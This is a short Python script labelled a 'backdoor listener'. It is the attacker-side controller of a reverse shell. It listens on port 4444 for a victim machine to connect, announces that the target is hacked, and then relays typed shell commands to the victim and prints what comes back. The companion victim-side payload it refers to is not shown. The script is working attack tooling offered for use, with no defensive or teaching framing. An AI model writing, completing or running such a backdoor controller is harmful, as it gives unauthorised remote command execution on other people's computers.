#NANO BACKDOOR(LISTENER)
import socket
import subprocess
 
TARGET = "127.0.0.1" #SET VICTIM IP 
port = 4444 # SET PORT (HINT:  MUST THE PORT IT SET SHOULD BE THE SAME PORT IN AONTHER FILE(VICTIM))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((TARGET, port))
sock.listen(1)

print(f"[+] Listening on port {port} ...")
client_socket, client_addr = sock.accept()
print(f"[+] Connection from {client_addr}")
print("WELLCOME NANO YOUR TARGET IS HACKED (:")

while True:
    command = input("Shell> ")
    if command.strip() == "":
        continue
    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    result = client_socket.recv(4096).decode()
    print(result)

client_socket.close()
sock.close()
